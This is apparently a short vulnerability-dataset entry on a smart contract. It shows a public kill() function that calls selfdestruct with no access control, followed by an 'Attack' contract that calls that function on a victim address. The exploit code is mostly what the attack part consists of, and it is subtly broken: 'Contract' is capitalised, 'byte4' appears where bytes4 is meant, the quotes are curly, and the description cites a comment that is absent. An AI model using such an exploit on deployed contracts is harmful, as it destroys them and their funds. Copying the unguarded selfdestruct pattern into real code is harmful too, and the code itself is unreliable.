## Vulnerable Code

```javascript
 function kill()  public {
        selfdestruct(address(0x094f2cdef86e77fd66ea9246ce8f2f653453a5ce));
}
```



## Exploit Code

```javascript
Contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“kill()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Let's look at the commant of '//Vulnerable position',the statement is not protected by any way.so if an malicious contract call the method -'kill'.In this situation, the victim contract can be destruct by any macious contract easily 
